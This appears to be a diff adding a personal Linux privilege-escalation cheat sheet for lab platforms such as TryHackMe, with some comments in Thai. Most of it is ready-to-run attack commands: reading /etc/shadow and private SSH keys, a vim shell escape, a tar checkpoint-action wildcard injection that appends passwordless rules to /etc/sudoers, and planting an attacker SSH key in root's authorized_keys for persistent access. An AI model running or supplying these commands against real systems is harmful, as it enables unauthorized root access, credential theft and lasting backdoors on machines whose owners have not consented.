@@ -1,0 +1,61 @@
+Add the machine to hosts 
+sudo echo "10.10.10.10 thm.htb" | sudo tee -a /etc/hosts
+
+Tools for elevating privileges
+sudo su (You should know the password first.)
+
+Find specific file permissions
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+
+Can you leverage to spawn a privileged shell
+sudo vim whatever
+:!sh
+
+Change UI Shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+Search Vulnerability
+find / -type f -name user.txt 2> /dev/null
+
+Looking SSH
+ls -l ~/.ssh
+cat ~/.ssh/id_rsa
+
+Open Server http
+python3 -m http.server 8080
+
+Location Hash passwd
+cat /etc/passwd
+cat /etc/shadow
+
+Writable /etc/sudoers
+# tar cf
+echo "" >> --checkpoint=1
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+# use all
+echo 'echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers' > shell.sh
+# use SUDO without password
+echo 'echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers' > shell.sh
+echo 'echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers' > shell.sh
+
+Automated Enumeration Tools
+LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.xyz
+LinEnum: https://github.com/rebootuser/LinEnum
+
+
+Linux PrivEsc
+https://tryhackme.com/r/room/linuxprivesc
+
+Privilege Escalation
+https://tryhackme.com/module/privilege-escalation?ref=blog.tryhackme.com
+
+
+sudo -l	List #แสดงรายการ sudo สิทธิพิเศษ ที่มีอยู่
+ssh-keygen -f key	#สร้างคีย์ SSH ใหม่
+echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized keys	#เพิ่มรหัสสาธารณะที่สร้างขึ้นให้กับผู้ใช้
+ssh root@10.10.10.10 -i key	#SSH ไปยังเซิร์ฟเวอร์ด้วยรหัสส่วนตัวที่สร้างขึ้น
+
+*หลังจากยกระดับสิทธ์สำเร็จ ให้หาเช็คและหา dir ที่มีประโยชน์ ls -la หรือ dir สำคัญหลัก /home, /root, /etc/shadow, /etc/crontab
